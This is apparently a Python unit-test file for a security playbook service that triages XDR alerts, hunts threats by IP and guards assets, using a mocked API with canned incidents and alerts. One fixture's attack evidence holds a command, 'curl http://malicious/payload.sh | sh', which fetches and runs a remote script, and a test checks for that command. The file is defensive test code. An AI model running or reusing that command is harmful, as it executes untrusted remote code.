from __future__ import annotations

import time
import unittest
from unittest.mock import patch

from sqlmodel import Session, delete

from app.core.db import engine, init_db
from app.models.db_models import CoreAsset, PlaybookRun
from app.playbook.service import playbook_service


class PlaybookRequester:
    def __init__(self, *, proof_as_dict: bool = False) -> None:
        self.count_payloads: list[dict] = []
        self.alert_payloads: list[dict] = []
        self.proof_as_dict = proof_as_dict

    def request(self, method, path, *, json_body=None, params=None, timeout=15, max_retries=3):
        _ = (method, params, timeout, max_retries)
        body = json_body or {}

        if path == "/api/xdr/v1/analysislog/networksecurity/count":
            self.count_payloads.append(dict(body))
            if body.get("attackStates") == [2, 3]:
                return {"code": "Success", "data": {"total": 3}}
            if body.get("severities") == [3, 4]:
                return {"code": "Success", "data": {"total": 11}}
            return {"code": "Success", "data": {"total": 66}}

        if path == "/api/xdr/v1/incidents/list":
            incident_records = {
                "incident-real-001": {
                    "uuId": "incident-real-001",
                    "name": "异常横向移动告警",
                    "incidentSeverity": 3,
                    "dealStatus": 0,
                    "hostIp": "10.10.0.2",
                    "endTime": 1739999900,
                    "riskTag": ["Weblogic"],
                    "hostGroups": ["生产"],
                },
                "incident-real-002": {
                    "uuId": "incident-real-002",
                    "name": "疑似C2通信活动",
                    "incidentSeverity": 4,
                    "dealStatus": 0,
                    "hostIp": "10.10.0.3",
                    "endTime": 1739999800,
                    "riskTag": ["C2"],
                    "hostGroups": ["办公"],
                },
                "incident-hunt-001": {
                    "uuId": "incident-hunt-001",
                    "name": "疑似外联",
                    "incidentSeverity": 3,
                    "dealStatus": 0,
                    "hostIp": "8.8.8.8",
                    "description": "src ip 8.8.8.8",
                    "endTime": 1739999900,
                },
            }
            if body.get("uuIds"):
                items = [incident_records[uid] for uid in body.get("uuIds", []) if uid in incident_records]
                return {"code": "Success", "data": {"total": len(items), "item": items}}
            page_size = body.get("pageSize", 50)
            page = body.get("page", 1)
            if body.get("dealStatus") == [0] and body.get("severities") == [3, 4]:
                return {
                    "code": "Success",
                    "data": {
                        "total": 509,
                        "item": [
                            incident_records["incident-real-001"],
                            incident_records["incident-real-002"],
                        ],
                    },
                }
            if page_size >= 200:
                if page > 1:
                    return {"code": "Success", "data": {"item": []}}
                return {
                    "code": "Success",
                    "data": {
                        "item": [incident_records["incident-hunt-001"]]
                    },
                }
            return {
                "code": "Success",
                "data": {
                    "item": [incident_records["incident-real-001"], incident_records["incident-real-002"]],
                },
            }

        if path == "/api/xdr/v1/alerts/list":
            self.alert_payloads.append(dict(body))
            src_ips = body.get("srcIps") or []
            dst_ips = body.get("dstIps") or []
            if "8.8.8.8" in src_ips:
                return {
                    "code": "Success",
                    "data": {
                        "total": 3,
                        "item": [
                            {
                                "uuId": "alert-src-001",
                                "name": "疑似外联告警",
                                "severity": 60,
                                "alertDealStatus": 1,
                                "lastTime": 1739999900,
                                "direction": 1,
                                "attackState": 3,
                                "srcIp": ["8.8.8.8"],
                                "dstIp": ["10.10.0.2"],
                                "dstPort": [445],
                                "riskTag": ["webshell"],
                                "threatSubTypeDesc": "远程命令执行",
                                "traceBackId": "incident-hunt-001",
                            }
                        ],
                    },
                }
            if "8.8.8.8" in dst_ips:
                return {
                    "code": "Success",
                    "data": {
                        "total": 2,
                        "item": [
                            {
                                "uuId": "alert-dst-001",
                                "name": "疑似入侵告警",
                                "severity": 75,
                                "alertDealStatus": 2,
                                "lastTime": 1739999800,
                                "direction": 2,
                                "srcIp": ["1.1.1.1"],
                                "dstIp": ["8.8.8.8"],
                            }
                        ],
                    },
                }
            if "10.10.0.2" in src_ips:
                return {
                    "code": "Success",
                    "data": {
                        "total": 4,
                        "item": [
                            {
                                "uuId": "alert-lateral-001",
                                "name": "SMB横向探测",
                                "severity": 68,
                                "alertDealStatus": 1,
                                "lastTime": 1739999700,
                                "direction": 3,
                                "srcIp": ["10.10.0.2"],
                                "dstIp": ["10.10.0.9"],
                                "dstPort": [445],
                            },
                            {
                                "uuId": "alert-lateral-002",
                                "name": "异常高频连接",
                                "severity": 55,
                                "alertDealStatus": 1,
                                "lastTime": 1739999650,
                                "direction": 3,
                                "srcIp": ["10.10.0.2"],
                                "dstIp": ["10.10.0.10"],
                                "dstPort": [49152],
                            },
                            {
                                "uuId": "alert-outbound-001",
                                "name": "异常外联目标",
                                "severity": 70,
                                "alertDealStatus": 2,
                                "lastTime": 1739999600,
                                "direction": 1,
                                "srcIp": ["10.10.0.2"],
                                "dstIp": ["3.3.3.3"],
                                "dstPort": [443],
                            },
                        ],
                    },
                }
            if "10.10.0.9" in src_ips:
                return {
                    "code": "Success",
                    "data": {
                        "total": 1,
                        "item": [
                            {
                                "uuId": "alert-outbound-002",
                                "name": "疑似数据回传",
                                "severity": 62,
                                "alertDealStatus": 2,
                                "lastTime": 1739999550,
                                "direction": 1,
                                "srcIp": ["10.10.0.9"],
                                "dstIp": ["4.4.4.4"],
                                "dstPort": [8443],
                            }
                        ],
                    },
                }
            return {"code": "Success", "data": {"total": 0, "item": []}}

        if path.endswith("/proof"):
            uid = path.split("/")[-2]
            record = {
                "name": f"{uid}-proof",
                "gptResultDescription": "攻击者利用 Weblogic 漏洞尝试执行命令，并伴随内网扩散迹象。",
                "riskTag": ["c2", "webshell"],
                "mitreIds": ["T1190", "T1059"],
                "vulInfo": "Weblogic 远程命令执行漏洞",
                "cve": "CVE-2020-14882",
                "vulType": "命令执行",
                "alertTimeLine": [
                    {
                        "name": "突破利用",
                        "severity": 90,
                        "stage": "遭受攻击",
                        "lastTime": 1739999000,
                        "proof": {
                            "srcIps": ["8.8.8.8"],
                            "dstIps": ["10.10.0.2"],
                            "attackResult": 1,
                            "cmdLine": "curl http://malicious/payload.sh | sh",
                            "url": ["http://malicious/payload.sh"],
                            "fileMd5": ["82713bc7177862a0d804e6059c8920ef"],
                        },
                    },
                    {
                        "name": "内网扩散",
                        "severity": 85,
                        "stage": "内网扩散",
                        "lastTime": 1739999100,
                        "proof": {
                            "srcIps": ["10.10.0.2"],
                            "dstIps": ["10.10.0.9"],
                            "path": "/tmp/dropper.sh",
                        },
                    },
                ],
            }
            return {
                "code": "Success",
                "data": record if self.proof_as_dict else [record],
            }

        if path.endswith("/entities/ip"):
            return {
                "code": "Success",
                "data": {
                    "item": [
                        {
                            "ip": "8.8.8.8",
                            "country": "US",
                            "province": "CA",
                            "location": "美国 加州",
                            "dealSuggestion": "建议封禁",
                            "intelligenceTag": ["僵尸网络", "C2服务器"],
                            "mappingTag": "Tor出口",
                            "alertRole": "攻击源",
                        },
                    ]
                },
            }

        if path == "/api/xdr/v1/assets/list":
            ip_filter = str(body.get("ip") or "")
            if ip_filter == "=10.10.0.2":
                return {
                    "code": "Success",
                    "data": [
                        {
                            "assetId": 1984925,
                            "assetName": "核心用户数据库",
                            "hostName": "PRD-DB-USER-01",
                            "ip": "10.10.0.2",
                            "magnitude": "core",
                            "system": "Linux",
                            "classifyName": "服务器",
                            "tags": ["生产", "数据库"],
                            "user": ["DBA"],
                            "sourceDevice": ["CWPP"],
                        }
                    ],
                }
            return {"code": "Success", "data": []}

        return {"code": "Failed", "message": f"unhandled path: {path}", "data": {}}


class EndlessIncidentsRequester:
    def __init__(self) -> None:
        self.page_calls = 0

    def request(self, method, path, *, json_body=None, params=None, timeout=15, max_retries=3):
        _ = (method, params, timeout, max_retries)
        body = json_body or {}
        if path != "/api/xdr/v1/incidents/list":
            return {"code": "Success", "data": {"total": 0, "item": []}}
        self.page_calls += 1
        page_size = body.get("pageSize", 200)
        page = body.get("page", 1)
        items = []
        for i in range(page_size):
            items.append(
                {
                    "uuId": f"incident-{page}-{i}",
                    "name": "模拟事件",
                    "description": "src 9.9.9.9",
                    "hostIp": "9.9.9.9",
                    "incidentSeverity": 3,
                    "dealStatus": 0,
                    "endTime": 1739990000,
                }
            )
        return {"code": "Success", "data": {"item": items}}


class PlaybookServiceTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        init_db()

    def setUp(self):
        with Session(engine) as session:
            session.exec(delete(PlaybookRun))
            session.exec(delete(CoreAsset))
            session.commit()

    def _wait_run_finished(self, session: Session, run_id: int, timeout_seconds: float = 8.0) -> PlaybookRun:
        deadline = time.time() + timeout_seconds
        while time.time() < deadline:
            session.expire_all()
            run = session.get(PlaybookRun, run_id)
            if run and run.status in {"Finished", "Failed"}:
                return run
            time.sleep(0.05)
        self.fail(f"playbook run timeout, run_id={run_id}")

    def test_alert_triage_and_threat_hunting_input_validation(self):
        with Session(engine) as session:
            with self.assertRaises(ValueError):
                playbook_service.start_run(
                    session,
                    template_id="alert_triage",
                    params={},
                    session_id="s-validation-1",
                )
            with self.assertRaises(ValueError):
                playbook_service.start_run(
                    session,
                    template_id="threat_hunting",
                    params={},
                    session_id="s-validation-2",
                )
            with self.assertRaises(ValueError):
                playbook_service.start_run(
                    session,
                    template_id="asset_guard",
                    params={},
                    session_id="s-validation-3",
                )
            with self.assertRaises(ValueError):
                playbook_service.start_run(
                    session,
                    template_id="asset_guard",
                    params={"asset_ip": "bad-ip"},
                    session_id="s-validation-4",
                )

    def test_alert_triage_count_payloads(self):
        fake_requester = PlaybookRequester()
        with (
            patch("app.playbook.service.get_requester_from_credential", return_value=fake_requester),
            patch("app.playbook.service.LLMRouter.complete", return_value="triage summary"),
        ):
            with Session(engine) as session:
                run = playbook_service.start_run(
                    session,
                    template_id="alert_triage",
                    params={"incident_uuid": "incident-real-001"},
                    session_id="s-triage-1",
                )
                final_run = self._wait_run_finished(session, run.id)
                self.assertEqual(final_run.status, "Finished")
                payload = playbook_service.serialize_run(final_run)
                result = payload.get("result", {})
                cards = result.get("cards", [])
                impact_card = next((card for card in cards if card.get("data", {}).get("namespace") == "triage_impact"), {})
                rows = impact_card.get("data", {}).get("rows", [])
                self.assertTrue(rows)
                self.assertIn("src_total", rows[0])
                self.assertIn("dst_total", rows[0])
                triage_view = result.get("triage_view", {})
                self.assertEqual(triage_view.get("header", {}).get("incident_name"), "异常横向移动告警")
                self.assertEqual(triage_view.get("attacker", {}).get("ip"), "8.8.8.8")
                self.assertEqual(triage_view.get("victim", {}).get("host_name"), "PRD-DB-USER-01")
                self.assertEqual(triage_view.get("victim", {}).get("asset_role"), "核心用户数据库")
                self.assertEqual(triage_view.get("victim", {}).get("asset_value"), "极高 (核心资产)")
                self.assertIn("CVE-2020-14882", triage_view.get("victim", {}).get("vulnerability", ""))
                self.assertTrue(triage_view.get("risk", {}).get("lateral_movement"))
                self.assertEqual(triage_view.get("risk", {}).get("authenticity"), "极高")
                self.assertTrue(triage_view.get("tactics", {}).get("mitre"))
                self.assertIn("curl http://malicious/payload.sh | sh", triage_view.get("payload", {}).get("raw_text", ""))
                self.assertIn("攻击真实性概率", result.get("summary", ""))

        payloads = fake_requester.count_payloads
        self.assertTrue(any(p.get("srcIps") == ["8.8.8.8"] for p in payloads))
        self.assertTrue(any(p.get("dstIps") == ["8.8.8.8"] for p in payloads))
        self.assertTrue(any(p.get("srcIps") == ["8.8.8.8"] and p.get("severities") == [3, 4] for p in payloads))
        self.assertTrue(any(p.get("dstIps") == ["8.8.8.8"] and p.get("severities") == [3, 4] for p in payloads))
        self.assertTrue(any(p.get("srcIps") == ["8.8.8.8"] and p.get("attackStates") == [2, 3] for p in payloads))
        self.assertTrue(any(p.get("dstIps") == ["8.8.8.8"] and p.get("attackStates") == [2, 3] for p in payloads))

    def test_threat_hunting_scan_limit(self):
        fake_requester = EndlessIncidentsRequester()
        result = playbook_service._scan_incidents_for_ip(
            fake_requester,
            ip="9.9.9.9",
            start_ts=1730000000,
            end_ts=1740000000,
            max_scan=2000,
            page_size=200,
        )
        self.assertEqual(result["scanned"], 2000)
        self.assertTrue(result["truncated"])
        self.assertEqual(fake_requester.page_calls, 10)

    def test_threat_hunting_param_normalization_caps_max_scan(self):
        normalized = playbook_service._normalize_params("threat_hunting", {"ip": "9.9.9.9", "max_scan": 100000})
        self.assertEqual(normalized.get("max_scan"), 10000)
        self.assertEqual(normalized.get("window_days"), 30)
        self.assertTrue(normalized.get("src_only_first"))
        self.assertEqual(normalized.get("adaptive_port_topn"), 5)
        self.assertEqual(normalized.get("pivot_ports"), [445, 139, 3389, 22, 5985, 5986, 135])

    def test_alert_triage_block_mode_accepts_batch_ips(self):
        normalized = playbook_service._normalize_params(
            "alert_triage",
            {"mode": "block_ip", "ips": "1.1.1.1, 2.2.2.2,1.1.1.1"},
        )
        self.assertEqual(normalized.get("ips"), ["1.1.1.1", "2.2.2.2"])

    def test_routine_check_returns_cards_and_next_actions(self):
        fake_requester = PlaybookRequester()
        with (
            patch("app.playbook.service.get_requester_from_credential", return_value=fake_requester),
            patch("app.playbook.service.LLMRouter.complete", return_value="morning summary"),
        ):
            with Session(engine) as session:
                run = playbook_service.start_run(
                    session,
                    template_id="routine_check",
                    params={},
                    session_id="s-routine-1",
                )
                final_run = self._wait_run_finished(session, run.id)
                self.assertEqual(final_run.status, "Finished")
                payload = playbook_service.serialize_run(final_run)
                result = payload.get("result", {})
                self.assertIn("summary", result)
                self.assertIn("509", result.get("summary", ""))
                self.assertGreaterEqual(len(result.get("cards", [])), 3)
                self.assertGreaterEqual(len(result.get("next_actions", [])), 1)

    def test_routine_check_dependency_declared(self):
        status = playbook_service._initial_node_status("routine_check", None)
        self.assertEqual(
            status["node_2_unhandled_high_events_24h"].get("depends_on"),
            ["node_1_log_count_24h"],
        )

    def test_asset_guard_returns_summary_and_cards(self):
        fake_requester = PlaybookRequester()
        with (
            patch("app.playbook.service.get_requester_from_credential", return_value=fake_requester),
            patch("app.playbook.service.LLMRouter.complete", return_value="asset guard summary"),
        ):
            with Session(engine) as session:
                run = playbook_service.start_run(
                    session,
                    template_id="asset_guard",
                    params={"asset_ip": "10.10.0.2", "asset_name": "核心资产A"},
                    session_id="s-asset-1",
                )
                final_run = self._wait_run_finished(session, run.id)
                self.assertEqual(final_run.status, "Finished")
                payload = playbook_service.serialize_run(final_run)
                result = payload.get("result", {})
                self.assertIn("summary", result)
                self.assertGreaterEqual(len(result.get("cards", [])), 3)
                trend = result.get("asset_guard_view", {}).get("trend", {})
                self.assertEqual(len(trend.get("labels", [])), 7)
                self.assertEqual(len(trend.get("inbound", [])), 7)
                self.assertEqual(len(trend.get("outbound", [])), 7)
                next_actions = result.get("next_actions", [])
                self.assertTrue(next_actions)
                self.assertTrue(all(action.get("template_id") == "alert_triage" for action in next_actions))
                self.assertTrue(all("封禁" in (action.get("label") or "") for action in next_actions))

    def test_action_labels_include_concrete_ip(self):
        fake_requester = PlaybookRequester()
        with (
            patch("app.playbook.service.get_requester_from_credential", return_value=fake_requester),
            patch("app.playbook.service.LLMRouter.complete", return_value="summary"),
        ):
            with Session(engine) as session:
                triage_run = playbook_service.start_run(
                    session,
                    template_id="alert_triage",
                    params={"incident_uuid": "incident-real-001"},
                    session_id="s-triage-action-label",
                )
                triage_final = self._wait_run_finished(session, triage_run.id)
                triage_result = playbook_service.serialize_run(triage_final).get("result", {})
                triage_labels = [action.get("label") or "" for action in triage_result.get("next_actions", [])]
                self.assertTrue(any("8.8.8.8" in label for label in triage_labels))

                hunting_run = playbook_service.start_run(
                    session,
                    template_id="threat_hunting",
                    params={"ip": "8.8.8.8"},
                    session_id="s-hunting-action-label",
                )
                hunting_final = self._wait_run_finished(session, hunting_run.id)
                hunting_result = playbook_service.serialize_run(hunting_final).get("result", {})
                hunting_labels = [action.get("label") or "" for action in hunting_result.get("next_actions", [])]
                self.assertTrue(any("执行IP 8.8.8.8封禁" in label for label in hunting_labels))
                self.assertIn("告警轨迹分析完成", hunting_result.get("summary", ""))
                threat_view = hunting_result.get("threat_view", {})
                self.assertEqual(threat_view.get("target_ip"), "8.8.8.8")
                self.assertEqual(threat_view.get("window_days"), 30)
                self.assertTrue(threat_view.get("kill_chain_stages"))
                self.assertTrue(threat_view.get("stage_evidence_cards"))
                self.assertTrue(threat_view.get("alert_table_rows"))
                self.assertIn("phase_1_surface", threat_view)
                self.assertIn("phase_2_breakthrough", threat_view)
                self.assertIn("phase_3_lateral", threat_view)
                self.assertIn("phase_4_outbound", threat_view)
                self.assertIn("pivot_nodes", threat_view)
                self.assertIn("timeline_points", threat_view)
                first_alert = threat_view.get("alert_table_rows")[0]
                self.assertIn("alert_id", first_alert)
                self.assertEqual(first_alert.get("direction"), "内对外")
                self.assertTrue(threat_view.get("phase_3_lateral", {}).get("observed"))
                self.assertTrue(threat_view.get("phase_4_outbound", {}).get("observed"))

    def test_threat_hunting_prefers_src_scan_before_dst_fallback(self):
        fake_requester = PlaybookRequester()
        with (
            patch("app.playbook.service.get_requester_from_credential", return_value=fake_requester),
            patch("app.playbook.service.LLMRouter.complete", return_value="summary"),
        ):
            with Session(engine) as session:
                run = playbook_service.start_run(
                    session,
                    template_id="threat_hunting",
                    params={"ip": "8.8.8.8"},
                    session_id="s-hunting-src-first",
                )
                final_run = self._wait_run_finished(session, run.id)
                self.assertEqual(final_run.status, "Finished")
        src_queries = [p for p in fake_requester.alert_payloads if p.get("srcIps") == ["8.8.8.8"]]
        dst_queries = [p for p in fake_requester.alert_payloads if p.get("dstIps") == ["8.8.8.8"]]
        self.assertTrue(src_queries)
        self.assertFalse(dst_queries)

    def test_parallel_nodes_tolerate_dict_proof_payload(self):
        fake_requester = PlaybookRequester(proof_as_dict=True)
        with (
            patch("app.playbook.service.get_requester_from_credential", return_value=fake_requester),
            patch("app.playbook.service.LLMRouter.complete", return_value="safe summary"),
        ):
            with Session(engine) as session:
                routine_run = playbook_service.start_run(
                    session,
                    template_id="routine_check",
                    params={},
                    session_id="s-proof-dict-routine",
                )
                routine_final = self._wait_run_finished(session, routine_run.id)
                self.assertEqual(routine_final.status, "Finished")

                triage_run = playbook_service.start_run(
                    session,
                    template_id="alert_triage",
                    params={"incident_uuid": "incident-real-001"},
                    session_id="s-proof-dict-triage",
                )
                triage_final = self._wait_run_finished(session, triage_run.id)
                self.assertEqual(triage_final.status, "Finished")

                hunting_run = playbook_service.start_run(
                    session,
                    template_id="threat_hunting",
                    params={"ip": "8.8.8.8"},
                    session_id="s-proof-dict-hunting",
                )
                hunting_final = self._wait_run_finished(session, hunting_run.id)
                self.assertEqual(hunting_final.status, "Finished")

    def test_triage_assessment_keeps_low_risk_consistent(self):
        assessment = playbook_service._build_triage_assessment(
            confidence_num=12,
            impact_high=0,
            impact_success=0,
            attack_success_count=0,
            boundary_breached=False,
            lateral_observed=False,
            risk_tags=[],
            mitre_ids=[],
            payload_lines=[],
            ai_results=["AI分析无异常"],
        )
        self.assertEqual(assessment.get("authenticity"), "较低")
        self.assertEqual(assessment.get("recommendation"), "归档告警，无需进一步处置")
        self.assertIn("无MITRE攻击技术匹配", assessment.get("key_evidence", ""))


if __name__ == "__main__":
    unittest.main()
